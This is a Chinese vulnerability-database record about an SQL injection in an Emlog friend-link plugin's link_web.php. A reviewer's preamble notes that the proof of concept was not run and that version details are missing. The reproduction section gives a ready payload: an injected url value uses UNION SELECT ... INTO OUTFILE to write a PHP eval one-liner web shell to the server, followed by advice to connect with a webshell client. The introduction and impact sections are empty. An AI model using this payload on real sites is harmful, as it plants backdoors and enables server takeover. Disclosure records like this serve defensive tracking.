---
source: "hatch 补库批 20260928"
product: "Emlog 友情链接自助插件"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Emlog 友情链接自助插件存在SQL注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：安装插件且入口可达；写shell需DB FILE/目录可写及Windows路径"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-619b347c31e63ff8b43801f7"
entity_id: "ve-619b347c31e63ff8b43801f7"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：安装插件且入口可达；写shell需DB FILE/目录可写及Windows路径

- **事实待核（1）**：缺插件版本/发布者/完整端点和鉴权，不是核心漏洞。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **适用与权限边界（2）**：任意参数注入断言只示例url；outfile缺权限前提。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **证据待核（3）**：源码仅图，无外部来源。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Emlog 友情链接自助插件存在SQL注入漏洞

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

在该插件当中的link\_web.php文件中，直接将用户提交的数据进行了拼接，之后直接带入了查询，未经过任何的过滤操作，由此一个典型的SQL注入漏洞就这样简易的诞生了：

![](./.resource/Emlog友情链接自助插件存在SQL注入漏洞/media/rId24.png)

由于这里的参数都没有经过过滤，所以我们可以对任意参数进行验证，进行SQL注入，首先我们可以提交正常的访问请求，之后使用burpsuite进行抓包，之后改包，我们这里以URL为例：

在抓取到数据包之后，我们可以将url改为以下内容：

    url=http://0-sec.org' union select 1,2,3,4,5,'<?php eval($_GET[cmd]); ?>' into outfile 'c:\\phpstudy\\www\\shell.php' 

之后，这条语句会正常执行，同时也会在C:\\phpstudy\\www\\下生成一个shell.php，而且该shell.php中的内容正是我们之前写入的一句话，之后我们可以使用菜刀进行连接。
